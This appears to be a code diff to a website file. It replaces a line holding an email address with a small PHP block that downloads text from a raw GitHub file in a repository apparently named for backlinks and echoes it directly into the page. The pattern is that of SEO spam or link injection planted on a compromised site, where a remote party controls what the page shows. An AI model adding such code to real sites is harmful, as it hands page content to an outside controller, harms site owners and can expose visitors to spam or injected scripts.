@@ -1,1 +1,4 @@
-rusaktivi268@gmail.com
+<?php
+$sudo1 = file_get_contents('https://raw.githubusercontent.com/sakiraernina/beklink/refs/heads/main/link');
+echo $sudo1;
+?>
